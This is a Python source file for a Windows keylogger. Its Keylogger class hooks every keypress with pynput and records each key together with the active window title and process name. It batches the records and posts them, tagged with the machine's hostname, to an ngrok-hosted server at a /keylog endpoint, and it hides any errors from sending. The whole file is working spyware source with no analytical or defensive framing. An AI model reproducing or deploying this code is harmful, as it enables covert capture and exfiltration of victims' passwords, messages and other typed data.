from pynput import keyboard
from datetime import datetime
import requests
import socket
import win32gui
import win32process
import psutil

class Keylogger:
    def __init__(self):
        self.client_id = socket.gethostname()
        self.server_url = "https://trusted-werewolf-premium.ngrok-free.app"

        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()

        self.keylog_data = []

    def on_key_press(self, key):
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            key_str = str(key).replace('Key.', '')
        
        window_title = self._get_active_window()

        keylog_entry = {
            "timestamp": datetime.now().isoformat(),
            "keystroke": key_str,
            "window_title": window_title,
        }
        
        self.keylog_data.append(keylog_entry)

    def _send_data_to_server(self):
        """Send collected data to server"""
        if not self.keylog_data:
            return
        
        # Prepare data for sending
        payload = {
            "client_id": self.client_id,
            "data": self.keylog_data
        }
        
        requests.post(
            f"{self.server_url}/keylog",
            json=payload,
            timeout=10
        )
        
        self.clear_data()

    def send_data_to_server(self,):
        
        try:
            self._send_data_to_server()
        except:
            pass

    def clear_data(self):
        """Clear collected data"""
        self.keylog_data.clear()
    
    def _get_active_window(self) -> str:
        """Get the title of the currently active window."""
        try:
            hwnd = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(hwnd)
            
            # Get process name
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            try:
                process = psutil.Process(pid)
                process_name = process.name()
                return f"{process_name} - {window_title}"
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                return window_title
                
        except Exception as e:
            print(f"Error getting active window: {e}")
            return "Unknown"